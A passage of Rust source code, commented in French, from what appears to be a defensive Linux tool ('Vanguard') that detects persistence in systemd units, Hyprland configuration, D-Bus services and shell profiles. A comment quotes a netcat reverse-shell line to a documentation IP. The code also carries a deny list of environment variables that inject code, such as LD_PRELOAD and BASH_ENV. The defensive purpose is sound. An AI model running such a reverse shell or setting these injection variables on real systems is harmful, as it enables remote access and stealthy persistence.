    /// Une unité d'un dossier que systemd lit aussi (user.attached, XDG_DATA_DIRS, XDG_CONFIG_DIRS, le dossier de
    /// session de systemd quand XDG_RUNTIME_DIR mène ailleurs).
    Dossier,
    /// Un service D-Bus de la session écrit par le compte (~/.local/share/dbus-1/services/*.service) : sa ligne
    /// « Exec= » se lance quand un programme demande ce nom sur le bus (vérification 2, mineurs), avant le service du
    /// même nom du système.
    DBus,
}

impl Sorte {
    fn de(f: &Path, r: &Releveur) -> Sorte {
        if r.de_la_session(f) {
            Sorte::Ajoutee(Ajout::Session)
        } else if r.dossiers_ajoutes.iter().any(|d| f.starts_with(d)) {
            Sorte::Ajoutee(Ajout::Dossier)
        } else if r.dossiers_dbus().iter().any(|d| f.starts_with(d)) {
            Sorte::Ajoutee(Ajout::DBus)
        } else if a_l_extension(f, "desktop") {
            Sorte::Bureau
        } else if r.dans_hypr(f) || r.hypr_inclus.iter().any(|h| h == f) || a_l_extension(f, "lua") {
            Sorte::Shell
        } else {
            Sorte::Unite {
                utilisateur: !f.starts_with(r.sous(Path::new("/etc/systemd/system"))),
            }
        }
    }

    fn contexte(self, maison: &str) -> designes::Contexte<'_> {
        match self {
            Sorte::Unite { utilisateur: true }
            | Sorte::Ajoutee(
                Ajout::Jointe {
                    bureau: false,
                    utilisateur: true,
                }
                | Ajout::Session
                | Ajout::Dossier
                | Ajout::DBus
                | Ajout::Reglage,
            ) => designes::Contexte::Unite(Some(maison)),
            Sorte::Unite { utilisateur: false }
            | Sorte::Ajoutee(Ajout::Jointe {
                bureau: false,
                utilisateur: false,
            }) => designes::Contexte::Unite(None),
            Sorte::Bureau | Sorte::Ajoutee(Ajout::Jointe { bureau: true, .. }) => designes::Contexte::Bureau,
            Sorte::Shell
            | Sorte::Ajoutee(
                Ajout::Raccourci | Ajout::LancementHypr | Ajout::Generateur | Ajout::JointeHypr | Ajout::CleHypr,
            ) => designes::Contexte::Shell,
        }
    }
}

/// Pourquoi une ligne ne dit pas sans ambiguïté ce qu'elle lance, prêt à suivre « la ligne « … » ».
fn raison_du_flou(f: designes::Flou) -> &'static str {
    use designes::Flou;
    match f {
        Flou::Syntaxe => tr!(
            "ne dit pas sans ambiguïté ce qu'elle lance (variable, sous-commande, tube, joker, guillemet ou code de systemd)",
            "does not say unambiguously what it starts (variable, subcommand, pipe, wildcard, quote or systemd specifier)"
        ),
        Flou::Blanc => tr!(
            "contient un blanc inhabituel ou un caractère invisible : l'écran ne la montre pas telle qu'elle se lit",
            "contains an unusual space or an invisible character: the screen does not show it the way it is read"
        ),
        Flou::Octet => tr!(
            "contient un octet qui n'est pas du texte (UTF-8) : ce qui se montre ne serait pas ce qui se lance",
            "contains a byte that is not text (UTF-8): what is shown would not be what is started"
        ),
        Flou::Argument => tr!(
            "donne un mot sans chemin à un programme non reconnu : Vanguard ne peut pas savoir ce qu'il lit",
            "gives a word without a path to an unrecognized program: Vanguard cannot know what it reads"
        ),
        Flou::Processus => tr!(
            "nomme un chemin par /proc, /dev, « . » ou « .. » : le fichier désigné dépend du programme qui le lit",
            "names a path through /proc, /dev, “.” or “..”: the file it names depends on the program that reads it"
        ),
        Flou::Relatif => tr!(
            "nomme un chemin relatif, qui dépend du dossier courant",
            "names a relative path, which depends on the current folder"
        ),
        Flou::NomNu => tr!(
            "nomme son programme sans chemin : il est cherché dans le PATH au lancement",
            "names its program without a path: it is looked up in PATH at launch"
        ),
        Flou::Maison => tr!(
            "désigne le dossier personnel par une variable (~, $HOME), qu'un autre fichier peut changer",
            "refers to the home folder through a variable (~, $HOME) that another file can change"
        ),
        Flou::Interprete => tr!(
            "lance un interpréteur sans script lié (code dans la ligne, module, entrée standard)",
            "starts an interpreter without a bound script (inline code, module, standard input)"
        ),
        Flou::Lanceur => tr!(
            "passe par un lanceur (env, nohup, sudo…) qui lance une autre commande",
            "goes through a launcher (env, nohup, sudo…) that starts another command"
        ),
        Flou::Option => tr!(
            "colle un chemin à une option, une forme qui n'est pas suivie",
            "glues a path to an option, a form that is not tracked"
        ),
        Flou::Trop => tr!(
            "désigne trop de fichiers, ou un chemin trop long",
            "names too many files, or a path that is too long"
        ),
        Flou::Vide => tr!("ne désigne aucun fichier", "names no file"),
    }
}

/// Les fichiers que désigne une ligne (`designes`), relevés sous la racine ; `commande` : une commande lancée, dont le
/// premier est le programme (sinon, des bibliothèques préchargées). `Err` : la ligne a la forme d'une porte dérobée,
/// ne dit pas sans ambiguïté ce qu'elle lance, lance une copie d'un interpréteur sous un autre nom, ou l'un d'eux ne
/// se relève pas.
fn cibles(
    r: &mut Releveur,
    d: Designe,
    ligne: &str,
    commande: bool,
) -> Result<Vec<(String, temoins::Etat)>, temoins::Refus> {
    // Exclue par sa raison, pas par sa syntaxe : « nc -e /bin/sh 192.0.2.7 4444 » se lit sans ambiguïté.
    if raison_grave(ligne).is_some() {
        return Err(temoins::Refus(
            tr!(
                "cette ligne a la forme d'une porte dérobée (shell inversé, script téléchargé ou caché) : elle ne se déclare jamais normale",
                "this line has the shape of a backdoor (reverse shell, downloaded or hidden script): it can never be declared normal"
            )
            .to_string(),
        ));
    }
    let chemins = match d {
        Designe::Chemins(c) => c,
        Designe::Indefini(flou) => {
            return Err(temoins::Refus(trf!(
                "la ligne « {} » {}",
                "the line “{}” {}",
                crate::ui::couper(&crate::ui::affichable(ligne.trim()), 80),
                raison_du_flou(flou)
            )));
        }
    };
    if commande && let Some(programme) = chemins.first() {
        copie_d_un_interprete(r, programme)?;
    }
    let mut sortie = Vec::with_capacity(chemins.len());
    for (i, c) in chemins.into_iter().enumerate() {
        let lu = r.sous(Path::new(&c));
        let montre = r.montre(&lu);
        // Seul le programme (ou une bibliothèque préchargée) peut être un binaire : tout autre fichier est lu par un
        // interpréteur, et doit se montrer comme il s'exécute (vérification de la campagne E, N4).
        let programme = !commande || i == 0;
        sortie.push((montre, temoins::etat_de_la_cible(&lu, programme, &mut r.budget)?));
    }
    Ok(sortie)
}

/// Les dossiers où se trouvent les interpréteurs et les lanceurs du système, à comparer à un programme inconnu.
const DOSSIERS_DES_INTERPRETES: [&str; 4] = ["/usr/bin", "/bin", "/usr/local/bin", "/usr/sbin"];

/// Un programme qui n'est ni un interpréteur ni un lanceur par son nom, mais dont le contenu est celui d'un
/// interpréteur ou d'un lanceur du système (une copie ou un lien dur sous un autre nom) : ses options (« -mmodule »,
/// « -fMakefile ») lui font lire des fichiers que rien ne lie, et la ligne ne se déclare pas. Comparé d'abord par
/// appareil et numéro, puis par taille, et seulement à taille égale par le contenu (`Err` : c'en est une copie).
fn copie_d_un_interprete(r: &mut Releveur, programme: &str) -> Result<(), temoins::Refus> {
    use std::os::unix::fs::MetadataExt as _;
    if designes::lit_un_script(programme) {
        return Ok(());
    }
    let lu = r.sous(Path::new(programme));
    let Ok(m) = std::fs::metadata(&lu) else {
        return Ok(());
    };
    if !m.is_file() {
        return Ok(());
    }
    let mut contenu: Option<[u8; 32]> = None;
    for d in DOSSIERS_DES_INTERPRETES {
        for e in std::fs::read_dir(r.sous(Path::new(d))).into_iter().flatten().flatten() {
            let nom = e.file_name();
            let Some(nom) = nom.to_str() else { continue };
            if !designes::lit_un_script(nom) {
                continue;
            }
            let Ok(autre) = std::fs::metadata(e.path()) else {
                continue;
            };
            if !autre.is_file() || autre.len() != m.len() {
                continue;
            }
            let copie = (autre.dev() == m.dev() && autre.ino() == m.ino())
                || {
                    let soi = match contenu {
                        Some(c) => Some(c),
                        None => empreinte_bornee(&lu, &mut r.budget),
                    };
                    contenu = soi;
                    // Un contenu qui ne se compare pas (illisible, budget du bilan épuisé) n'est pas « pas une copie » :
                    // dans le doute, refusé (deuxième vérification de la campagne E).
                    match (soi, empreinte_bornee(&e.path(), &mut r.budget)) {
                        (Some(a), Some(b)) => a == b,
                        _ => {
                            return Err(temoins::Refus(trf!(
                                "{} ne se compare pas à {} (illisible, ou trop de fichiers relus pour ce bilan) : ce pourrait en être une copie",
                                "{} cannot be compared with {} (unreadable, or too many files re-read for this check): it could be a copy of it",
                                crate::ui::affichable(&r.montre(&lu)),
                                crate::ui::affichable(&format!("{d}/{nom}"))
                            )));
                        }
                    }
                };
            if copie {
                return Err(temoins::Refus(trf!(
                    "{} est une copie de {} sous un autre nom : ses options lui font lire des fichiers que Vanguard ne suit pas",
                    "{} is a copy of {} under another name: its options make it read files that Vanguard does not track",
                    crate::ui::affichable(&r.montre(&lu)),
                    crate::ui::affichable(&format!("{d}/{nom}"))
                )));
            }
        }
    }
    Ok(())
}

/// Le BLAKE3 d'un fichier ordinaire pris sur le budget du bilan ; `None` : illisible ou budget épuisé.
fn empreinte_bornee(chemin: &Path, budget: &mut temoins::Budget) -> Option<[u8; 32]> {
    let m = std::fs::metadata(chemin).ok()?;
    if !budget.prendre(m.len()) {
        return None;
    }
    let lu = temoins::lire_borne(chemin, m.len()).ok()?;
    lu.entier.then(|| *blake3::hash(&lu.octets).as_bytes())
}

/// Au-delà de `TEMOINS_MAX` lignes, l'alerte ne se déclare pas : les suivantes ne sont pas relues.
fn place(t: &Lancements) -> Result<(), temoins::Refus> {
    if t.temoins.len() >= temoins::TEMOINS_MAX {
        return Err(temoins::Refus(trf!(
            "plus de {} lignes signalées, plus que celles qui se montrent avant un tel choix",
            "more than {} reported lines, more than can be shown before such a choice",
            temoins::TEMOINS_MAX
        )));
    }
    Ok(())
}

/// Au plus autant d'octets lus dans un fichier de démarrage ou de configuration.
const LECTURE_MAX: u64 = 32 * 1024 * 1024;

/// Un fichier de démarrage ou de configuration lu : ses octets (liés par un choix), son texte (jugé ; un octet qui
/// n'est pas de l'UTF-8 ne fait plus sauter le fichier), et s'il a été lu en entier.
struct Lecture {
    octets: Vec<u8>,
    texte: String,
    entier: bool,
}

/// Lit un fichier de démarrage ou de configuration, borné (`temoins::lire_borne` : jamais un tube, un périphérique
/// ni plus de `LECTURE_MAX` octets). Ce qui ne se lit pas en entier, ou un tube nommé à la place du fichier, est dit
/// dans l'alerte, jamais compté comme sain ; absent ou interdit de lecture, il est sauté comme avant.
fn lire(f: &Path, h: &Path, t: &mut Lancements) -> Option<Lecture> {
    match temoins::lire_borne(f, LECTURE_MAX) {
        Ok(lu) => {
            if !lu.entier {
                non_lu(
                    f,
                    h,
                    t,
                    tr!("trop gros pour être lu en entier", "too large to be read in full"),
                );
            }
            Some(Lecture {
                texte: String::from_utf8_lossy(&lu.octets).into_owned(),
                entier: lu.entier,
                octets: lu.octets,
            })
        }
        Err(_) if std::fs::metadata(f).is_ok_and(|m| std::os::unix::fs::FileTypeExt::is_fifo(&m.file_type())) => {
            non_lu(
                f,
                h,
                t,
                tr!("tube nommé à la place d'un fichier", "named pipe instead of a file"),
            );
            None
        }
        Err(_) => None,
    }
}

/// Un fichier de démarrage ou de configuration qui ne se lit pas en entier : une ligne de l'alerte.
fn non_lu(f: &Path, h: &Path, t: &mut Lancements, raison: &str) {
    t.sources
        .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), "non lu"));
    t.retraits.push(None);
    t.temoins.push(Err(temoins::Refus(trf!(
        "{} ne se lit pas en entier",
        "{} cannot be read in full",
        court(f, h)
    ))));
    t.suspects.push(trf!(
        "{} : {raison}, non vérifié",
        "{}: {raison}, not checked",
        court(f, h)
    ));
}

/// Le témoin d'une ligne `l` (numéro `n`, à partir de 0) du fichier `f`, dont `lu` est le contenu ; pour une ligne
/// d'unité systemd, aussi ce qui change l'unité sans toucher à la ligne (`unite`). `commande` : `designe` vient d'une
/// commande lancée (sinon, d'un préchargement : `cibles`).
#[allow(clippy::too_many_arguments)]
fn temoin_de_ligne(
    t: &mut Lancements,
    fichier: &Path,
    n: usize,
    lu: &Lecture,
    ligne: &str,
    designe: Designe,
    commande: bool,
    sorte: Sorte,
) -> Result<temoins::Temoin, temoins::Refus> {
    if let Some(refus) = hors_du_perimetre(&t.r, fichier, n.saturating_add(1), ligne, sorte, commande) {
        return Err(refus);
    }
    place(t)?;
    // Un octet qui n'est pas de l'UTF-8, dans le fichier ou son chemin : lu « avec pertes », il se montrerait et se
    // suivrait autrement que le lanceur, qui garde l'octet tel quel.
    if std::str::from_utf8(&lu.octets).is_err() || fichier.to_str().is_none() {
        return Err(octet_refuse(&court(fichier, &t.r.maison)));
    }
    if !t.r.maison.is_absolute() {
        return Err(temoins::Refus(
            tr!("le dossier personnel est inconnu", "the home folder is unknown").to_string(),
        ));
    }
    let mut cibles = cibles(&mut t.r, designe, ligne, commande)?;
    if !lu.entier {
        return Err(temoins::Refus(trf!(
            "{} ne se lit pas en entier",
            "{} cannot be read in full",
            court(fichier, &t.r.maison)
        )));
    }
    if let Sorte::Unite { utilisateur } = sorte {
        cibles.extend(unite(&mut t.r, fichier, &lu.texte, utilisateur, Some(ligne))?);
    }
    cibles.push(environnement_lie(&t.r)?);
    let numero = n.saturating_add(1);
    Ok(temoins::temoin(
        &format!("{}:{numero}", fichier.to_string_lossy()),
        format!("{}:{numero}", court(fichier, &t.r.maison)),
        ligne,
        Some(&temoins::etat_du_contenant(fichier, &lu.octets)?),
        &cibles,
    ))
}

/// Le périmètre de ce qui se déclare normal (décision de l'auteur, 10 nov. 2026) : une ligne d'une unité systemd de
/// l'utilisateur (la liste fermée de `directive_refusee`, chaque ligne Exec liée ; sous /etc/systemd/user, à root
/// seul) ou une ligne de lancement d'un fichier de ~/.config/hypr par son chemin réel. Tout le reste reste levé jusqu'au retrait de la ligne : un profil de shell, un fichier
/// de variables, une ligne de Hyprland qui pose une variable ou vient d'un fichier inclus ailleurs, et ce qui n'a pas
/// de lien sûr à son effet (.desktop, cron, préchargement, unité du système). La détection, elle, reste entière.
fn hors_du_perimetre(
    r: &Releveur,
    fichier: &Path,
    numero: usize,
    ligne: &str,
    sorte: Sorte,
    commande: bool,
) -> Option<temoins::Refus> {
    let ou = crate::ui::affichable(&court(fichier, &r.maison));
    let hypr = r.dans_hypr(fichier);
    match sorte {
        Sorte::Ajoutee(ajout) => Some(refus_ajoute(ajout, &ou, numero, ligne)),
        Sorte::Unite { utilisateur: true } if r.du_compte(fichier) || de_root_seul(fichier) => None,
        Sorte::Unite { utilisateur: true } => Some(temoins::Refus(trf!(
            "{ou}:{numero} : une unité de /etc/systemd/user que le compte peut changer (le fichier ou un dossier de son chemin n'est pas à root seul) ne peut pas être déclarée normale : rendez-la à root ou retirez la ligne",
            "{ou}:{numero}: a unit in /etc/systemd/user that the account can change (the file or a folder of its path is not root-only) cannot be declared normal: give it back to root or remove the line"
        ))),
        // Un module qu'Omarchy charge hors de ~/.config/hypr (état, thème, ou qui en masque un autre) : jamais
        // déclarable (deuxième vérification, N11).
        Sorte::Shell if r.modules.iter().any(|m| m == fichier) => Some(temoins::Refus(trf!(
            "{ou}:{numero} : une ligne d'un module Lua qu'Omarchy charge hors de ~/.config/hypr (état, thème) ne peut pas être déclarée normale : retirez la ligne, ou mettez-la dans ~/.config/hypr",
            "{ou}:{numero}: a line of a Lua module Omarchy loads outside ~/.config/hypr (state, theme) cannot be declared normal: remove the line, or put it in ~/.config/hypr"
        ))),
        Sorte::Shell if commande && hypr && !r.dans_hypr_reel(fichier) => Some(temoins::Refus(trf!(
            "{ou}:{numero} : ce fichier de Hyprland est lu par un lien qui mène hors de ~/.config/hypr (le fichier, le dossier ou un sous-dossier) : il ne peut pas être déclaré normal ; remplacez le lien par le fichier lui-même",
            "{ou}:{numero}: this Hyprland file is read through a link that leads outside ~/.config/hypr (the file, the folder or a subfolder): it cannot be declared normal; replace the link with the file itself"
        ))),
        // Un fichier lu par « source = » sans être un .conf de ~/.config/hypr (« extra.inc », ou hors du dossier) :
        // jamais déclarable, même sous ~/.config/hypr (relecture adverse, C6).
        Sorte::Shell if r.hypr_inclus.iter().any(|h| h == fichier) => Some(temoins::Refus(trf!(
            "{ou}:{numero} : une ligne d'un fichier que Hyprland lit par « source » (hors de ~/.config/hypr, ou qui n'y est pas un .conf) ne peut pas être déclarée normale : retirez ou déplacez la ligne",
            "{ou}:{numero}: a line of a file Hyprland reads through “source” (outside ~/.config/hypr, or not a .conf there) cannot be declared normal: remove or move the line"
        ))),
        Sorte::Shell if commande && hypr => None,
        Sorte::Shell if hypr || r.hypr_inclus.iter().any(|h| h == fichier) => Some(temoins::Refus(trf!(
            "{ou}:{numero} : une ligne de Hyprland qui pose une variable, ou d'un fichier inclus hors de ~/.config/hypr, ne peut pas être déclarée normale : retirez ou déplacez la ligne",
            "{ou}:{numero}: a Hyprland line that sets a variable, or from a file included outside ~/.config/hypr, cannot be declared normal: remove or move the line"
        ))),
        Sorte::Shell
            if !fichier.starts_with(r.sous(Path::new("/etc/cron.d")))
                && fichier != r.sous(Path::new("/etc/crontab"))
                && fichier != r.sous(Path::new("/etc/ld.so.preload")) =>
        {
            Some(temoins::Refus(trf!(
                "{ou}:{numero} : une ligne d'un profil de shell ou d'un fichier de variables de démarrage (environment.d, réglages de systemd) ne peut pas être déclarée normale : retirez ou déplacez la ligne",
                "{ou}:{numero}: a line of a shell profile or of a startup variable file (environment.d, systemd settings) cannot be declared normal: remove or move the line"
            )))
        }
        _ => Some(hors_des_deux(&format!("{ou}:{numero}"))),
    }
}

/// La clé d'une ligne de réglage d'unité, telle qu'à montrer : « Clé= », et pour « Environment= » la première
/// variable hors des permises (`variable_permise`, `valeur_permise`), sinon la première posée : « Environment=NOM ».
/// Écrite par qui a posé la ligne : rendue affichable et coupée.
fn cle_de_reglage(ligne: &str) -> String {
    let montre = |t: &str| crate::ui::couper(&crate::ui::affichable(t), 40);
    let Some((cle, valeur)) = ligne.split_once('=') else {
        return montre(ligne.trim_matches([' ', '\t']));
    };
    let cle = cle.trim_matches([' ', '\t']);
    if cle != "Environment" {
        return format!("{}=", montre(cle));
    }
    let mots = mots_de_systemd(valeur.trim_matches([' ', '\t'])).unwrap_or_default();
    let variables: Vec<(&str, &str)> = mots.iter().filter_map(|m| m.split_once('=')).collect();
    let nom = variables
        .iter()
        .find(|(n, v)| !variable_permise(n) || !valeur_permise(n, v))
        .or_else(|| variables.first())
        .map_or("", |(n, _)| n);
    format!("{cle}={}", montre(nom))
}

/// Le refus d'un lancement vu par le lot de détection de la persistance (`Ajout`), avec sa raison et où il est (`ou`
/// affichable, `numero` de sa première ligne ; un générateur, programme et non ligne, se montre par son seul chemin).
/// Un réglage d'unité nomme sa clé, lue dans la `ligne` (`cle_de_reglage`).
fn refus_ajoute(ajout: Ajout, ou: &str, numero: usize, ligne: &str) -> temoins::Refus {
    temoins::Refus(match ajout {
        Ajout::Jointe { .. } => trf!(
            "{ou}:{numero} : une ligne coupée par « \\ » en fin de ligne (ou par une fin de ligne que seul systemd voit) ne peut pas être déclarée normale : écrivez-la sur une seule ligne, ou retirez-la",
            "{ou}:{numero}: a line split by \"\\\" at the end of a line (or by a line ending only systemd sees) cannot be declared normal: write it on a single line, or remove it"
        ),
        Ajout::Session => trf!(
            "{ou}:{numero} : une unité du dossier de la session (XDG_RUNTIME_DIR/systemd) ne peut pas être déclarée normale : un programme du compte l'écrit et elle disparaît à l'arrêt ; retirez-la ou mettez-la dans ~/.config/systemd/user",
            "{ou}:{numero}: a unit in the session folder (XDG_RUNTIME_DIR/systemd) cannot be declared normal: a program of the account writes it and it vanishes at shutdown; remove it or put it in ~/.config/systemd/user"
        ),
        Ajout::Raccourci => trf!(
            "{ou}:{numero} : un raccourci de Hyprland qui lance une commande ne peut pas être déclaré normal : retirez la ligne, ou rangez le programme ailleurs que dans un dossier caché ou temporaire",
            "{ou}:{numero}: a Hyprland shortcut that starts a command cannot be declared normal: remove the line, or store the program outside a hidden or temporary folder"
        ),
        Ajout::LancementHypr => trf!(
            "{ou}:{numero} : un lancement de Hyprland précédé de règles (« [ … ] ») ne peut pas être déclaré normal : retirez la ligne ou ses règles",
            "{ou}:{numero}: a Hyprland launch preceded by rules (\"[ … ]\") cannot be declared normal: remove the line or its rules"
        ),
        Ajout::Generateur => trf!(
            "{ou} : un générateur de systemd ne peut pas être déclaré normal : retirez-le, ou rendez-le à root s'il vient d'un paquet",
            "{ou}: a systemd generator cannot be declared normal: remove it, or give it back to root if it comes from a package"
        ),
        Ajout::JointeHypr => trf!(
            "{ou}:{numero} : une ligne de Hyprland coupée par « \\ » en fin de ligne ne peut pas être déclarée normale : écrivez-la sur une seule ligne, ou retirez-la",
            "{ou}:{numero}: a Hyprland line split by \"\\\" at the end of a line cannot be declared normal: write it on a single line, or remove it"
        ),
        Ajout::CleHypr => trf!(
            "{ou}:{numero} : ce que lance ou charge cette ligne (greffon, commande d'hypridle, variable, appel Lua non lu) ne se lie pas à elle : elle ne peut pas être déclarée normale ; retirez-la, ou rangez le programme ailleurs que dans un dossier caché ou temporaire",
            "{ou}:{numero}: what this line starts or loads (plugin, hypridle command, variable, unread Lua call) is not bound to it: it cannot be declared normal; remove it, or store the program outside a hidden or temporary folder"
        ),
        Ajout::Reglage => {
            let cle = cle_de_reglage(ligne);
            trf!(
                "{ou}:{numero} : « {cle} » est un réglage d'unité qui change ce qui se lance (variable, bibliothèque préchargée, dossier de recherche des programmes, fichier de variables, dossier courant, entrée) ou qui n'est pas dans la liste de ce que Vanguard reconnaît comme sûr : il ne peut pas être déclaré normal ; retirez-le",
                "{ou}:{numero}: “{cle}” is a unit setting that changes what starts (variable, preloaded library, program search folder, variable file, working folder, input) or that is not in the list of what Vanguard recognises as safe: it cannot be declared normal; remove it"
            )
        }
        Ajout::Dossier => trf!(
            "{ou}:{numero} : une unité d'un dossier que systemd lit en plus des habituels (user.attached, XDG_DATA_DIRS, XDG_CONFIG_DIRS, dossier de session de systemd) ne peut pas être déclarée normale : retirez-la ou mettez-la dans ~/.config/systemd/user",
            "{ou}:{numero}: a unit in a folder systemd reads besides the usual ones (user.attached, XDG_DATA_DIRS, XDG_CONFIG_DIRS, systemd session folder) cannot be declared normal: remove it or put it in ~/.config/systemd/user"
        ),
        Ajout::DBus => trf!(
            "{ou}:{numero} : un service D-Bus de la session écrit par le compte ne peut pas être déclaré normal : il se lance dès qu'un programme demande son nom, à la place de celui du système ; retirez le fichier",
            "{ou}:{numero}: a session D-Bus service written by the account cannot be declared normal: it starts as soon as a program asks for its name, instead of the system one; remove the file"
        ),
    })
}

/// Le refus d'une ligne qui n'est ni d'une unité de l'utilisateur ni un lancement de ~/.config/hypr (`ou` affichable).
fn hors_des_deux(ou: &str) -> temoins::Refus {
    temoins::Refus(trf!(
        "{ou} : seules une unité systemd de l'utilisateur et une ligne de lancement de ~/.config/hypr peuvent être déclarées normales : retirez ou déplacez cette ligne",
        "{ou}: only a systemd user unit and a launch line of ~/.config/hypr can be declared normal: remove or move this line"
    ))
}

/// Ce qui se lie de l'environnement des sessions : sous ce nom, chaque fichier qui pose des variables, en entier.
const ENVIRONNEMENT: &str = "[env] profils, environment.d, pam_env, systemd, Hyprland";

/// Au plus autant de fichiers lus en suivant leurs « source » (au-delà des fichiers connus) : une chaîne plus longue
/// ne se suit pas.
const SOURCES_MAX: usize = 64;

/// Au plus autant de lignes qui posent des variables hors de la liste sûre, montrées en clair dans le détail.
const VARIABLES_MONTREES: usize = 40;

/// Des variables qui font charger du code, mais que des paquets de base posent dans /etc/profile.d (AWKLIBPATH par
/// gawk, VSSCRIPT_PATH par vapoursynth) : refusées comme les autres, sauf dans un fichier que seul root peut changer
/// (`de_root_seul`), où un programme du compte ne les pose pas ; ce fichier reste lié en entier. Les refuser
/// partout rendrait chaque ligne non déclarable sur toute machine Arch (troisième vérification de la campagne E).
const DE_PAQUETS: [&str; 2] = ["AWKLIBPATH", "VSSCRIPT_PATH"];

/// Une variable de la famille « injection » : elle fait charger du code à un programme ou à un interpréteur
/// (bibliothèques, modules, options, fichier lu au démarrage d'un shell). Posée dans un fichier des variables, elle
/// rend chaque ligne non déclarable, au moment du choix comme après : le fichier qu'elle nomme n'est pas lié, et
/// changerait ce que fait la ligne acceptée (deuxième vérification de la campagne E, P1). Les variables qui ne font
/// que dire où chercher (PATH, HOME, XDG_*) ne sont pas de cette famille : leurs fichiers restent liés en entier
/// (limite écrite au modèle de menace).
fn variable_d_injection(nom: &str) -> bool {
    const DEBUTS: [&str; 9] = [
        "LD_",
        "BASH_FUNC_",
        "PYTHON",
        "PERL5",
        "GST_PLUGIN",
        "LUA_PATH",
        "LUA_CPATH",
        "LUA_INIT",
        "OPENSSL_",
    ];
    const NOMS: [&str; 46] = [
        "BASH_ENV",
        "ENV",
        "SHELLOPTS",
        "BASHOPTS",
        "PS4",
        "PERLLIB",
        "RUBYOPT",
        "RUBYLIB",
        "NODE_OPTIONS",
        "NODE_PATH",
        "GCONV_PATH",
        "GTK_MODULES",
        "GTK3_MODULES",
        "GTK_PATH",
        "GTK_EXE_PREFIX",
        "GTK_IM_MODULE_FILE",
        "GDK_PIXBUF_MODULE_FILE",
        "GDK_PIXBUF_MODULEDIR",
        "GIO_EXTRA_MODULES",
        "GIO_MODULE_DIR",
        "QT_PLUGIN_PATH",
        "QT_QPA_PLATFORM_PLUGIN_PATH",
        "QML_IMPORT_PATH",
        "QML2_IMPORT_PATH",
        "LIBGL_DRIVERS_PATH",
        "LIBVA_DRIVERS_PATH",
        "GBM_BACKENDS_PATH",
        "__EGL_VENDOR_LIBRARY_FILENAMES",
        "__EGL_VENDOR_LIBRARY_DIRS",
        "VK_ICD_FILENAMES",
        "VK_DRIVER_FILES",
        "VK_ADD_DRIVER_FILES",
        "VK_LAYER_PATH",
        "VK_ADD_LAYER_PATH",
        "JAVA_TOOL_OPTIONS",
        "_JAVA_OPTIONS",
        "JDK_JAVA_OPTIONS",
        "CLASSPATH",
        "TCLLIBPATH",
        // Le dossier d'où Omarchy charge sa bibliothèque Lua et ses scripts (bootstrap.lua, hyprland.lua).
        "OMARCHY_PATH",
        // Les dossiers où systemd prend ses unités et ses générateurs, à la place des habituels
        // (« ManagerEnvironment= » de user.conf les pose au gestionnaire du compte).
        "SYSTEMD_UNIT_PATH",
        "SYSTEMD_GENERATOR_PATH",
        "SYSTEMD_ENVIRONMENT_GENERATOR_PATH",
        // Vérification 3, P11 : une bibliothèque chargée par .NET, SDL ou Wine au démarrage d'un programme.
        "DOTNET_STARTUP_HOOKS",
        "SDL_DYNAMIC_API",
        "WINEDLLPATH",
    ];
    DEBUTS.iter().any(|d| nom.starts_with(d)) || NOMS.contains(&nom)
}

/// Une ligne telle qu'un lecteur la décode : échappements « \xHH », « \uHHHH », « \UHHHHHHHH », octal « \NNN »
/// décodés, toute autre barre oblique inverse retirée, guillemets retirés, « $ » d'un « $'…' » compris
/// (« L\D_PRELOAD », « "LD_"'PRELOAD' »,
/// « $'\x4c'D_PRELOAD », « \x4cD_PRELOAD » de systemd nomment tous LD_PRELOAD).
fn decodee(l: &str) -> String {
    let mut sortie = String::with_capacity(l.len());
    let mut cs = l.chars().peekable();
    while let Some(c) = cs.next() {
        match c {
            // « $'…' » et « $"…" » : des guillemets (ANSI-C, traduits), pas une lecture de variable.
            '$' if matches!(cs.peek(), Some('\'' | '"')) => {}
            '"' | '\'' => {}
            '\\' => {
                let (base, max) = match cs.peek() {
                    Some('x') => (16, 2),
                    Some('u') => (16, 4),
                    Some('U') => (16, 8),
                    Some('0'..='7') => (8, 3),
                    Some(_) => {
                        if let Some(suivant) = cs.next() {
                            sortie.push(suivant);
                        }
                        continue;
                    }
                    None => continue,
                };
                if base == 16 {
                    cs.next();
                }
                let mut valeur: u32 = 0;
                let mut lus: u32 = 0;
                while lus < max
                    && let Some(chiffre) = cs.peek().and_then(|x| x.to_digit(base))
                {
                    valeur = valeur.saturating_mul(base).saturating_add(chiffre);
                    cs.next();
                    lus = lus.saturating_add(1);
                }
                sortie.push(char::from_u32(valeur).unwrap_or('\u{fffd}'));
            }
            c => sortie.push(c),
        }
    }
    sortie
}

/// La première variable de la famille « injection » (`variable_d_injection`) qu'une ligne peut poser, après
/// décodage : tout mot qui la nomme, sauf une simple lecture (« $NOM », « ${NOM} », « ${#NOM} », « ${!NOM} ») ;
/// « ${NOM=…} » et « ${NOM:=…} » la posent, et comptent. Une lecture ne change rien à ce que lance la ligne
/// acceptée (bash-completion lit SHELLOPTS) ; tout le reste, même « unset » ou un mot qui n'en pose pas, est pris
/// dans le doute pour une écriture.
fn injection_nommee(l: &str, de_root: bool) -> Option<String> {
    let texte = decodee(l);
    let octets = texte.as_bytes();
    let mot = |b: u8| b.is_ascii_alphanumeric() || b == b'_';
    let mut i = 0usize;
    while i < octets.len() {
        if !octets.get(i).copied().is_some_and(mot) {
            i = i.saturating_add(1);
            continue;
        }
        let debut = i;
        while octets.get(i).copied().is_some_and(mot) {
            i = i.saturating_add(1);
        }
        let Some(nom) = texte.get(debut..i) else { continue };
        if !variable_d_injection(nom) && (de_root || !DE_PAQUETS.contains(&nom)) {
            continue;
        }
        let avant = |n: usize| debut.checked_sub(n).and_then(|k| octets.get(k).copied());
        let suite = texte.get(i..).unwrap_or_default();
        let accolade = avant(1) == Some(b'{') && avant(2) == Some(b'$')
            || matches!(avant(1), Some(b'#' | b'!')) && avant(2) == Some(b'{') && avant(3) == Some(b'$');
        let lecture = avant(1) == Some(b'$') || accolade && !(suite.starts_with('=') || suite.starts_with(":="));
        if !lecture {
            return Some(nom.to_string());
        }
    }
    None
}

/// La sorte d'un fichier des variables, qui dit comment il pose une variable pour la session.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Variables {
    /// Un profil ou un fichier qu'il lit : « export A=… », « declare -x », « setenv » (csh), « set -x » (fish).
    Shell,
    /// environment.d, /etc/environment, pam_env : « A=… », « A DEFAULT=… ».
    Cles,
    /// Les réglages du gestionnaire de systemd : DefaultEnvironment=, ManagerEnvironment=.
    Systemd,
    /// Hyprland : « env = A,… ».
    Hypr,
}

impl Variables {
